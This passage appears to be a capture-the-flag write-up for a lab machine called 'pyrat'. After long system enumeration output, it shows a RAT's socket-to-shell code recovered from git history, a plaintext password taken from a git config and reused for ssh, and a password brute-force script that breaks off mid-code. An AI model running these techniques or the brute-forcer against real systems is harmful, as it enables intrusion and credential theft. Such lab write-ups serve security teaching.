-rw-r--r-- 1 root root  394 Apr  1  2020 paths.target
-rw-r--r-- 1 root root  592 Apr  1  2020 poweroff.target
-rw-r--r-- 1 root root  417 Apr  1  2020 printer.target
-rw-r--r-- 1 root root  745 Apr  1  2020 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  718 Apr  1  2020 proc-sys-fs-binfmt_misc.mount
-rw-r--r-- 1 root root  583 Apr  1  2020 reboot.target
-rw-r--r-- 1 root root  549 Apr  1  2020 remote-cryptsetup.target
-rw-r--r-- 1 root root  436 Apr  1  2020 remote-fs-pre.target
-rw-r--r-- 1 root root  522 Apr  1  2020 remote-fs.target
-rw-r--r-- 1 root root  492 Apr  1  2020 rescue.target
-rw-r--r-- 1 root root  540 Apr  1  2020 rpcbind.target
-rw-r--r-- 1 root root  442 Apr  1  2020 shutdown.target
-rw-r--r-- 1 root root  402 Apr  1  2020 sigpwr.target
-rw-r--r-- 1 root root  460 Apr  1  2020 sleep.target
-rw-r--r-- 1 root root  449 Apr  1  2020 slices.target
-rw-r--r-- 1 root root  420 Apr  1  2020 smartcard.target
-rw-r--r-- 1 root root  396 Apr  1  2020 sockets.target
-rw-r--r-- 1 root root  420 Apr  1  2020 sound.target
-rw-r--r-- 1 root root  503 Apr  1  2020 suspend.target
-rw-r--r-- 1 root root  577 Apr  1  2020 suspend-then-hibernate.target
-rw-r--r-- 1 root root  393 Apr  1  2020 swap.target
-rw-r--r-- 1 root root  823 Apr  1  2020 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  558 Apr  1  2020 sysinit.target
-rw-r--r-- 1 root root  738 Apr  1  2020 sys-kernel-debug.mount
-rw-r--r-- 1 root root  764 Apr  1  2020 sys-kernel-tracing.mount
-rw-r--r-- 1 root root 1.4K Apr  1  2020 syslog.socket
-rw-r--r-- 1 root root  722 Apr  1  2020 systemd-ask-password-console.path
-rw-r--r-- 1 root root  737 Apr  1  2020 systemd-ask-password-console.service
-rw-r--r-- 1 root root  650 Apr  1  2020 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  742 Apr  1  2020 systemd-ask-password-wall.service
-rw-r--r-- 1 root root 1.4K Apr  1  2020 systemd-boot-system-token.service
-rw-r--r-- 1 root root  556 Apr  1  2020 systemd-exit.service
-rw-r--r-- 1 root root  579 Apr  1  2020 systemd-halt.service
-rw-r--r-- 1 root root  546 Apr  1  2020 systemd-initctl.socket
-rw-r--r-- 1 root root 1.2K Apr  1  2020 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root  882 Apr  1  2020 systemd-journald.socket
-rw-r--r-- 1 root root  738 Apr  1  2020 systemd-journald@.socket
-rw-r--r-- 1 root root  597 Apr  1  2020 systemd-journald-varlink@.socket
-rw-r--r-- 1 root root  773 Apr  1  2020 systemd-journal-flush.service
-rw-r--r-- 1 root root  592 Apr  1  2020 systemd-kexec.service
-rw-r--r-- 1 root root  728 Apr  1  2020 systemd-machine-id-commit.service
-rw-r--r-- 1 root root  633 Apr  1  2020 systemd-networkd.socket
-rw-r--r-- 1 root root  556 Apr  1  2020 systemd-poweroff.service
-rw-r--r-- 1 root root  551 Apr  1  2020 systemd-reboot.service
-rw-r--r-- 1 root root  726 Apr  1  2020 systemd-rfkill.socket
-rw-r--r-- 1 root root  695 Apr  1  2020 systemd-sysusers.service
-rw-r--r-- 1 root root  658 Apr  1  2020 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  490 Apr  1  2020 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  739 Apr  1  2020 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  779 Apr  1  2020 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  635 Apr  1  2020 systemd-udevd-control.socket
-rw-r--r-- 1 root root  610 Apr  1  2020 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  852 Apr  1  2020 systemd-udev-settle.service
-rw-r--r-- 1 root root  753 Apr  1  2020 systemd-udev-trigger.service
-rw-r--r-- 1 root root  434 Apr  1  2020 system-systemd-cryptsetup.slice
-rw-r--r-- 1 root root 1.4K Apr  1  2020 system-update-cleanup.service
-rw-r--r-- 1 root root  543 Apr  1  2020 system-update-pre.target
-rw-r--r-- 1 root root  617 Apr  1  2020 system-update.target
-rw-r--r-- 1 root root  445 Apr  1  2020 timers.target
-rw-r--r-- 1 root root  426 Apr  1  2020 time-set.target
-rw-r--r-- 1 root root  479 Apr  1  2020 time-sync.target
-rw-r--r-- 1 root root  457 Apr  1  2020 umount.target
-rw-r--r-- 1 root root  432 Apr  1  2020 user.slice
-rw-r--r-- 1 root root  498 Apr  1  2020 lxd-agent.service
-rw-r--r-- 1 root root  489 Apr  1  2020 lxd-agent-9p.service
-rw-r--r-- 1 root root  482 Feb 25  2020 man-db.service
-rw-r--r-- 1 root root  164 Feb 25  2020 man-db.timer
-rw-r--r-- 1 root root  400 Feb 13  2020 blk-availability.service
-rw-r--r-- 1 root root  341 Feb 13  2020 dm-event.service
-rw-r--r-- 1 root root  248 Feb 13  2020 dm-event.socket
-rw-r--r-- 1 root root  323 Feb 13  2020 lvm2-lvmpolld.service
-rw-r--r-- 1 root root  239 Feb 13  2020 lvm2-lvmpolld.socket
-rw-r--r-- 1 root root  602 Feb 13  2020 lvm2-monitor.service
-rw-r--r-- 1 root root  338 Feb 13  2020 lvm2-pvscan@.service
lrwxrwxrwx 1 root root    9 Feb 13  2020 lvm2.service -> /dev/null
-rw-r--r-- 1 root root  454 Feb 13  2020 irqbalance.service
-rw-r--r-- 1 root root  358 Feb 11  2020 dmesg.service
-rw-r--r-- 1 root root  316 Feb 11  2020 cron.service
-rw-r--r-- 1 root root  222 Feb 10  2020 usb_modeswitch@.service
-rw-r--r-- 1 root root  266 Jan 21  2020 ufw.service
-rw-r--r-- 1 root root  997 Dec 10  2019 upower.service
-rw-r--r-- 1 root root  171 Nov 30  2019 usbmuxd.service
-rw-r--r-- 1 root root  312 Nov 27  2019 console-setup.service
-rw-r--r-- 1 root root  287 Nov 27  2019 keyboard-setup.service
-rw-r--r-- 1 root root  330 Nov 27  2019 setvtrgb.service
-rw-r--r-- 1 root root  142 Nov 11  2019 apport-forward@.service
-rw-r--r-- 1 root root  246 Nov 11  2019 apport-forward.socket
-rw-r--r-- 1 root root  175 Aug 11  2019 polkit.service
-rw-r--r-- 1 root root  604 Jul  8  2019 secureboot-db.service
-rw-r--r-- 1 root root  695 Jan 21  2019 logrotate.service
-rw-r--r-- 1 root root  347 Nov 12  2018 atd.service
-rw-r--r-- 1 root root  618 Oct  2  2018 friendly-recovery.service
-rw-r--r-- 1 root root  172 Oct  2  2018 friendly-recovery.target
-rw-r--r-- 1 root root  192 Jan  4  2018 logrotate.timer

/lib/systemd/system/sshd-keygen@.service.d:
total 4.0K
-rw-r--r-- 1 root root 410 Jan 15  2025 disable-sshd-keygen-if-cloud-init-active.conf

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Jun 17  2024 getty.target -> ../getty.target
lrwxrwxrwx 1 root root 33 Jun 17  2024 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 25 Jun 17  2024 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 39 Jun 17  2024 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 Jun 17  2024 systemd-user-sessions.service -> ../systemd-user-sessions.service
lrwxrwxrwx 1 root root 15 Oct 25  2022 dbus.service -> ../dbus.service
lrwxrwxrwx 1 root root 24 Nov  2  2020 plymouth-quit.service -> ../plymouth-quit.service
lrwxrwxrwx 1 root root 29 Nov  2  2020 plymouth-quit-wait.service -> ../plymouth-quit-wait.service

/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Jun 17  2024 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Jun 17  2024 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 32 Jun 17  2024 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
lrwxrwxrwx 1 root root 34 Jun 17  2024 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 Jun 17  2024 systemd-journald.socket -> ../systemd-journald.socket
lrwxrwxrwx 1 root root 31 Jun 17  2024 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Jun 17  2024 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
lrwxrwxrwx 1 root root 14 Oct 25  2022 dbus.socket -> ../dbus.socket

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 20 Jun 17  2024 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 Jun 17  2024 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 Jun 17  2024 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 28 Jun 17  2024 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 36 Jun 17  2024 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 32 Jun 17  2024 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 Jun 17  2024 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 Jun 17  2024 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 27 Jun 17  2024 sys-kernel-tracing.mount -> ../sys-kernel-tracing.mount
lrwxrwxrwx 1 root root 36 Jun 17  2024 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 Jun 17  2024 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 36 Jun 17  2024 systemd-boot-system-token.service -> ../systemd-boot-system-token.service
lrwxrwxrwx 1 root root 30 Jun 17  2024 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
lrwxrwxrwx 1 root root 27 Jun 17  2024 systemd-journald.service -> ../systemd-journald.service
lrwxrwxrwx 1 root root 32 Jun 17  2024 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 36 Jun 17  2024 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
lrwxrwxrwx 1 root root 31 Jun 17  2024 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 Jun 17  2024 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 Jun 17  2024 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 27 Jun 17  2024 systemd-sysusers.service -> ../systemd-sysusers.service
lrwxrwxrwx 1 root root 37 Jun 17  2024 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 Jun 17  2024 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 24 Jun 17  2024 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 31 Jun 17  2024 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 30 Jun 17  2024 systemd-update-utmp.service -> ../systemd-update-utmp.service
lrwxrwxrwx 1 root root 30 Nov  2  2020 plymouth-read-write.service -> ../plymouth-read-write.service
lrwxrwxrwx 1 root root 25 Nov  2  2020 plymouth-start.service -> ../plymouth-start.service

/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Jun 17  2024 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer

/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Jun 17  2024 getty-static.service -> ../getty-static.service

/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Jun 17  2024 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/rc-local.service.d:
total 4.0K
-rw-r--r-- 1 root root 290 Jun 17  2024 debian.conf

/lib/systemd/system/user@.service.d:
total 4.0K
-rw-r--r-- 1 root root 125 Jun 17  2024 timeout.conf

/lib/systemd/system/user-.slice.d:
total 4.0K
-rw-r--r-- 1 root root 486 Apr  1  2020 10-defaults.conf

/lib/systemd/system/system-update.target.wants:
total 0
lrwxrwxrwx 1 root root 31 May 11  2023 fwupd-offline-update.service -> ../fwupd-offline-update.service
lrwxrwxrwx 1 root root 36 Sep 23  2020 packagekit-offline-update.service -> ../packagekit-offline-update.service

/lib/systemd/system/halt.target.wants:
total 0
lrwxrwxrwx 1 root root 24 Nov  2  2020 plymouth-halt.service -> ../plymouth-halt.service

/lib/systemd/system/initrd-switch-root.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Nov  2  2020 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 31 Nov  2  2020 plymouth-switch-root.service -> ../plymouth-switch-root.service

/lib/systemd/system/kexec.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Nov  2  2020 plymouth-kexec.service -> ../plymouth-kexec.service

/lib/systemd/system/poweroff.target.wants:
total 0
lrwxrwxrwx 1 root root 28 Nov  2  2020 plymouth-poweroff.service -> ../plymouth-poweroff.service

/lib/systemd/system/reboot.target.wants:
total 0
lrwxrwxrwx 1 root root 26 Nov  2  2020 plymouth-reboot.service -> ../plymouth-reboot.service

/lib/systemd/system/local-fs.target.wants:
total 0

/lib/systemd/system/runlevel1.target.wants:
total 0

/lib/systemd/system/runlevel2.target.wants:
total 0

/lib/systemd/system/runlevel3.target.wants:
total 0

/lib/systemd/system/runlevel4.target.wants:
total 0

/lib/systemd/system/runlevel5.target.wants:
total 0

/lib/systemd/system-generators:
total 444K
-rwxr-xr-x 1 root root 3.1K Mar 13  2025 cloud-init-generator
lrwxrwxrwx 1 root root   22 Jun 28  2024 netplan -> ../../netplan/generate
-rwxr-xr-x 1 root root  15K Jun 17  2024 systemd-bless-boot-generator
-rwxr-xr-x 1 root root  35K Jun 17  2024 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root  15K Jun 17  2024 systemd-debug-generator
-rwxr-xr-x 1 root root  39K Jun 17  2024 systemd-fstab-generator
-rwxr-xr-x 1 root root  19K Jun 17  2024 systemd-getty-generator
-rwxr-xr-x 1 root root  35K Jun 17  2024 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root  15K Jun 17  2024 systemd-hibernate-resume-generator
-rwxr-xr-x 1 root root  15K Jun 17  2024 systemd-rc-local-generator
-rwxr-xr-x 1 root root  15K Jun 17  2024 systemd-run-generator
-rwxr-xr-x 1 root root  15K Jun 17  2024 systemd-system-update-generator
-rwxr-xr-x 1 root root  35K Jun 17  2024 systemd-sysv-generator
-rwxr-xr-x 1 root root  19K Jun 17  2024 systemd-veritysetup-generator
-rwxr-xr-x 1 root root  360 Jan 29  2024 postfix-instance-generator
-rwxr-xr-x 1 root root 148K Feb 13  2020 lvm2-activation-generator
-rwxr-xr-x 1 root root  286 Jun 21  2019 friendly-recovery

/lib/systemd/user:
total 128K
drwxr-xr-x 2 root root 4.0K Apr 27  2025 graphical-session-pre.target.wants
-rw-r--r-- 1 root root  231 Mar 29  2025 dirmngr.service
-rw-r--r-- 1 root root  546 Jun 17  2024 graphical-session-pre.target
drwxr-xr-x 2 root root 4.0K Dec 22  2023 sockets.target.wants
-rw-r--r-- 1 root root  287 Apr  3  2023 ssh-agent.service
-rw-r--r-- 1 root root  360 Oct 25  2022 dbus.service
-rw-r--r-- 1 root root  174 Oct 25  2022 dbus.socket
-rw-r--r-- 1 root root  165 Sep 23  2020 pk-debconf-helper.service
-rw-r--r-- 1 root root  127 Sep 23  2020 pk-debconf-helper.socket
-rw-r--r-- 1 root root  147 Jun 23  2020 glib-pacrunner.service
-rw-r--r-- 1 root root  497 Apr  1  2020 basic.target
-rw-r--r-- 1 root root  419 Apr  1  2020 bluetooth.target
-rw-r--r-- 1 root root  463 Apr  1  2020 default.target
-rw-r--r-- 1 root root  502 Apr  1  2020 exit.target
-rw-r--r-- 1 root root  484 Apr  1  2020 graphical-session.target
-rw-r--r-- 1 root root  394 Apr  1  2020 paths.target
-rw-r--r-- 1 root root  417 Apr  1  2020 printer.target
-rw-r--r-- 1 root root  442 Apr  1  2020 shutdown.target
-rw-r--r-- 1 root root  420 Apr  1  2020 smartcard.target
-rw-r--r-- 1 root root  396 Apr  1  2020 sockets.target
-rw-r--r-- 1 root root  420 Apr  1  2020 sound.target
-rw-r--r-- 1 root root  500 Apr  1  2020 systemd-exit.service
-rw-r--r-- 1 root root  657 Apr  1  2020 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  533 Apr  1  2020 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  720 Apr  1  2020 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  445 Apr  1  2020 timers.target
-rw-r--r-- 1 root root  204 Aug 28  2017 dirmngr.socket
-rw-r--r-- 1 root root  298 Aug 28  2017 gpg-agent-browser.socket
-rw-r--r-- 1 root root  281 Aug 28  2017 gpg-agent-extra.socket
-rw-r--r-- 1 root root  223 Aug 28  2017 gpg-agent.service
-rw-r--r-- 1 root root  234 Aug 28  2017 gpg-agent.socket
-rw-r--r-- 1 root root  308 Aug 28  2017 gpg-agent-ssh.socket

/lib/systemd/user/graphical-session-pre.target.wants:
total 0
lrwxrwxrwx 1 root root 20 Apr 11  2025 ssh-agent.service -> ../ssh-agent.service

/lib/systemd/user/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 14 Oct 25  2022 dbus.socket -> ../dbus.socket

/lib/systemd/user-environment-generators:
total 20K
-rwxr-xr-x 1 root root 15K Jun 17  2024 30-systemd-environment-d-generator
-rw-r--r-- 1 root root 851 Jan  6  2021 90gpg-agent

/lib/systemd/catalog:
total 160K
-rw-r--r-- 1 root root  13K Jun 17  2024 systemd.be.catalog
-rw-r--r-- 1 root root 9.8K Jun 17  2024 systemd.be@latin.catalog
-rw-r--r-- 1 root root  14K Jun 17  2024 systemd.bg.catalog
-rw-r--r-- 1 root root  15K Jun 17  2024 systemd.catalog
-rw-r--r-- 1 root root  471 Jun 17  2024 systemd.de.catalog
-rw-r--r-- 1 root root  13K Jun 17  2024 systemd.fr.catalog
-rw-r--r-- 1 root root  16K Jun 17  2024 systemd.it.catalog
-rw-r--r-- 1 root root  15K Jun 17  2024 systemd.pl.catalog
-rw-r--r-- 1 root root 8.1K Jun 17  2024 systemd.pt_BR.catalog
-rw-r--r-- 1 root root  20K Jun 17  2024 systemd.ru.catalog
-rw-r--r-- 1 root root 7.1K Jun 17  2024 systemd.zh_CN.catalog
-rw-r--r-- 1 root root 7.1K Jun 17  2024 systemd.zh_TW.catalog

/lib/systemd/system-preset:
total 4.0K
-rw-r--r-- 1 root root 1.5K Apr  1  2020 90-systemd.preset

/lib/systemd/user-preset:
total 4.0K
-rw-r--r-- 1 root root 744 Apr  1  2020 90-systemd.preset

/lib/systemd/network:
total 32K
-rw-r--r-- 1 root root  44 Jun 17  2024 73-usb-net-by-mac.link
-rw-r--r-- 1 root root 645 Apr  1  2020 80-container-host0.network
-rw-r--r-- 1 root root 718 Apr  1  2020 80-container-ve.network
-rw-r--r-- 1 root root 704 Apr  1  2020 80-container-vz.network
-rw-r--r-- 1 root root  78 Apr  1  2020 80-wifi-adhoc.network
-rw-r--r-- 1 root root 101 Apr  1  2020 80-wifi-ap.network.example
-rw-r--r-- 1 root root  64 Apr  1  2020 80-wifi-station.network.example
-rw-r--r-- 1 root root 491 Apr  1  2020 99-default.link

/lib/systemd/ntp-units.d:
total 4.0K
-rw-r--r-- 1 root root 26 Apr  1  2020 80-systemd-timesync.list

/lib/systemd/system-shutdown:
total 8.0K
-rwxr-xr-x 1 root root 252 May 11  2023 fwupd.shutdown
-rwxr-xr-x 1 root root 160 Sep 28  2020 mdadm.shutdown

/lib/systemd/logind.conf.d:
total 4.0K
-rw-r--r-- 1 root root 38 Apr 25  2022 unattended-upgrades-logind-maxdelay.conf

/lib/systemd/system-sleep:
total 8.0K
-rwxr-xr-x 1 root root 219 Apr 25  2022 unattended-upgrades
-rwxr-xr-x 1 root root  92 Aug 21  2019 hdparm

/lib/systemd/boot:
total 4.0K
drwxr-xr-x 2 root root 4.0K Apr 27  2025 efi

/lib/systemd/boot/efi:
total 148K
-rwxr-xr-x 1 root root 55K Jun 17  2024 linuxx64.efi.stub
-rwxr-xr-x 1 root root 90K Jun 17  2024 systemd-bootx64.efi

/lib/systemd/user-generators:
total 0


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.31


### INTERESTING FILES ####################################
[-] Useful file locations:
/usr/bin/nc
/usr/bin/netcat
/usr/bin/wget
/usr/bin/curl


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 2004 Dec 28 21:17 /etc/passwd
-rw-r--r-- 1 root root 917 Dec 28 21:17 /etc/group
-rw-r--r-- 1 root root 581 Dec  5  2019 /etc/profile
-rw-r----- 1 root shadow 1249 Dec 28 21:17 /etc/shadow
[-] SUID files:
-rwsr-xr-x 1 root root 22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 477672 Apr 11  2025 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 88464 Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 85064 Feb  6  2024 /usr/bin/chfn
-rwsr-xr-x 1 root root 166056 Apr  4  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 53040 Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 68208 Feb  6  2024 /usr/bin/passwd
-rwsr-xr-x 1 root root 55528 Apr  9  2024 /usr/bin/mount
-rwsr-xr-x 1 root root 67816 Apr  9  2024 /usr/bin/su
-rwsr-xr-x 1 root root 44784 Feb  6  2024 /usr/bin/newgrp
-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39144 Apr  9  2024 /usr/bin/umount
[-] SGID files:
-rwxr-sr-x 1 root utmp 14648 Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 43168 Jan 10  2024 /usr/sbin/pam_extrausers_chkpwd
-r-xr-sr-x 1 root postdrop 22760 Jan 29  2024 /usr/sbin/postqueue
-r-xr-sr-x 1 root postdrop 22808 Jan 29  2024 /usr/sbin/postdrop
-rwxr-sr-x 1 root shadow 43160 Jan 10  2024 /usr/sbin/unix_chkpwd
-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwxr-sr-x 1 root ssh 350504 Apr 11  2025 /usr/bin/ssh-agent
-rwxr-sr-x 1 root root 15368 Mar 20  2020 /usr/bin/dotlock.mailutils
-rwxr-sr-x 1 root shadow 84512 Feb  6  2024 /usr/bin/chage
-rwxr-sr-x 1 root tty 14488 Mar 30  2020 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 31312 Feb  6  2024 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 43720 Feb 13  2020 /usr/bin/crontab
[+] Files with POSIX capabilities set:
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 685 Feb 14  2020 /etc/e2scrub.conf
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 533 Jan 21  2019 /etc/logrotate.conf
-rw-r--r-- 1 root root 3028 Feb 23  2022 /etc/adduser.conf
-rw-r--r-- 1 root root 2351 Feb 13  2020 /etc/sysctl.conf
-rw-r--r-- 1 root root 2584 Feb  1  2020 /etc/gai.conf
-rw-r--r-- 1 root root 350 Feb 23  2022 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 92 Dec  5  2019 /etc/host.conf
-rw-r--r-- 1 root root 191 Feb 18  2020 /etc/libaudit.conf
-rw-r--r-- 1 root root 510 Feb 23  2022 /etc/nsswitch.conf
-rw-r--r-- 1 root root 5060 Aug 21  2019 /etc/hdparm.conf
-rw-r--r-- 1 root root 41 Apr  6  2020 /etc/multipath.conf
-rw-r--r-- 1 root root 6920 Nov  2  2021 /etc/overlayroot.conf
-rw-r--r-- 1 root root 14867 Feb  1  2019 /etc/ltrace.conf
-rw-r--r-- 1 root root 2969 Aug  3  2019 /etc/debconf.conf
-rw-r--r-- 1 root root 552 Dec 17  2019 /etc/pam.conf
-rw-r--r-- 1 root root 1260 Dec 14  2018 /etc/ucf.conf
-rw-r--r-- 1 root root 808 Feb 14  2020 /etc/mke2fs.conf
-rw-r--r-- 1 root root 642 Sep 24  2019 /etc/xattr.conf
-rw-r--r-- 1 root root 604 Sep 15  2018 /etc/deluser.conf
-rw-r--r-- 1 root root 8182 Apr 27  2025 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 1382 Feb 11  2020 /etc/rsyslog.conf
-rw-r--r-- 1 root root 1523 Feb 10  2020 /etc/usb_modeswitch.conf
-rw-r--r-- 1 root root 34 Apr 14  2020 /etc/ld.so.conf
[-] Any interesting mail in /var/mail:
total 12
drwxrwsr-x  2 root mail 4096 Jun 21  2023 .
drwxr-xr-x 12 root root 4096 Dec 22  2023 ..
lrwxrwxrwx  1 root mail    9 Jun 21  2023 root -> /dev/null
-r--r--r--  1 root mail  617 Jun 21  2023 think
lrwxrwxrwx  1 root mail    9 Jun 21  2023 www-data -> /dev/null
```
2. Identify possible attack point.

/var/mail/think
```markdown
From root@pyrat  Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by pyrat.localdomain (Postfix, from userid 0)
        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
Subject: Hello
To: <think@pyrat>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
```
3. Identify `.git` inside of `/opt/dev` for sensitive information.
    1. `export HOME=/tmp`
    2. `git config --global --add safe.directory /opt/dev`
    ```markdown
    <$ git config --global --add safe.directory /opt/dev
    www-data@ip-10-67-130-81:/opt/dev$ git -C /opt/dev log -P
    git -C /opt/dev log -P
    commit 0a3c36d66369fd4b07ddca72e5379461a63470bf
    Author: Jose Mario <josemlwdf@github.com>
    Date:   Wed Jun 21 09:32:14 2023 +0000

        Added shell endpoint
    ```
    3. `git -C /opt/dev show 0a3c36d66369fd4b07ddca72e5379461a63470bf`
    ```markdown
    <t/dev show 0a3c36d66369fd4b07ddca72e5379461a63470bf
    commit 0a3c36d66369fd4b07ddca72e5379461a63470bf
    Author: Jose Mario <josemlwdf@github.com>
    Date:   Wed Jun 21 09:32:14 2023 +0000

        Added shell endpoint

    diff --git a/pyrat.py.old b/pyrat.py.old
    new file mode 100644
    index 0000000..ce425cf
    --- /dev/null
    +++ b/pyrat.py.old
    @@ -0,0 +1,27 @@
    +...............................................
    +
    +def switch_case(client_socket, data):
    +    if data == 'some_endpoint':
    +        get_this_enpoint(client_socket)
    +    else:
    +        # Check socket is admin and downgrade if is not aprooved
    +        uid = os.getuid()
    +        if (uid == 0):
    +            change_uid()
    +
    +        if data == 'shell':
    +            shell(client_socket)
    +        else:
    +            exec_python(client_socket, data)
    +
    +def shell(client_socket):
    +    try:
    +        import pty
    +        os.dup2(client_socket.fileno(), 0)
    +        os.dup2(client_socket.fileno(), 1)
    +        os.dup2(client_socket.fileno(), 2)
    +        pty.spawn("/bin/sh")
    +    except Exception as e:
    +        send_data(client_socket, e
    +
    +...............................................
    ```
4. Cat `/opt/dev/.git/config`
```markdown
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
    	name = Jose Mario
    	email = josemlwdf@github.com

[credential]
    	helper = cache --timeout=3600

[credential "https://github.com"]
    	username = think
    	password = _TH1NKINGPirate$_
```
5. Attempt to ssh into tihnk `think@host` with the password.
6. Read `/home/think/` files.
7. Python Brute (rockyou)
```python
import socket;import sys
def pwn(rHost, rPort, wl):
    try:
        with open(wl, 'r', encoding='latin-1') as f:
            for line in f:
                password = line.strip()
                try:
                    cS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    cS.settimeout(1)
                    print(f"[!] Attempting {str(password)}")
                    cS.connect((rHost, rPort))
                    cS.sendall(b"admin\n")
                    cS.recv(1024)
                    cS.sendall(f"{password}\n".encode())
                    response = cS.recv(1024).decode(errors='ignore')
                    print(f"[*] {str(rHost)}:{str(rPort)} -- ({str(password)}) // {str(response)}",end="\r")
                    if "Welcome" in response or "root" in response or "Admin" in response:
